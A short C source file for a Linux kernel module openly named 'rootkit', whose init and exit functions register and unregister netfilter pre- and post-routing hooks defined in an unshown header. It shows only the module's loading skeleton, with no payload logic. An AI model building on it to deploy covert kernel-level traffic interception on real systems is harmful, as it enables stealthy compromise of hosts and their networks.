#include "rootkit.h"

static int __init rootkit_init(void)
{
    print_rules(pre_routing_rules, ARRAY_SIZE(pre_routing_rules));
    print_rules(post_routing_rules, ARRAY_SIZE(post_routing_rules));
    nf_register_net_hooks(&init_net, nf_ops, ARRAY_SIZE(nf_ops));

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    nf_unregister_net_hooks(&init_net, nf_ops, ARRAY_SIZE(nf_ops));

    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);